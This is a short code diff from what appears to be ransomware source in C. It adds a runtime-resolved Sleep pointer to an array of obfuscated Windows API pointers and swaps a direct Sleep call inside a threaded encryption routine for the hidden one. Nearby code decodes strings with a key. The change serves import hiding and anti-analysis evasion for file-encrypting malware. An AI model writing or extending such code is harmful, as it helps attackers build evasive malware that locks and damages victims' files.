@@ -1,6 +1,6 @@
 #include "Threading.h"
 THREAD_STRUCT threadStruct;
-extern FARPROC APIArray[54];
+extern FARPROC APIArray[55];
 MemelstrcmpA TemplstrcmpA;
 MemeStrStrIA TempStrStrIA;
 MemeCreateFileA TempCreateFileA2;
@@ -21,6 +21,7 @@ MemeInitializeCriticalSection TempInitializeCriticalSection;
 MemeCreateThread TempCreateThread;
 MemeWaitForMultipleObjects TempWaitForMultipleObjects;
 MemeDeleteCriticalSection TempDeleteCriticalSection;
+MemeSleep TempSleep;
 void populateAPIThreading() {
 	TemplstrcmpA = (MemelstrcmpA)APIArray[25];
 	TempStrStrIA = (MemeStrStrIA)APIArray[51];
@@ -42,6 +43,7 @@ void populateAPIThreading() {
 	TempCreateThread = (MemeCreateThread)APIArray[34];
 	TempWaitForMultipleObjects = (MemeWaitForMultipleObjects)APIArray[35];
 	TempDeleteCriticalSection = (MemeDeleteCriticalSection)APIArray[36];
+	TempSleep = (MemeSleep)APIArray[54];
 }
 
 void resolveStringThreading(BYTE* buffer, BYTE* key, int size) {
@@ -302,7 +304,7 @@ void threadEncrypt(THREAD_STRUCT* pThreadStruct) {
 			}
 			TempLeaveCriticalSection(&pThreadStruct->threadCriticalSection);
 			counter++;
-			Sleep(500);
+			TempSleep(500);
 		}
 
 		if (!curr) {
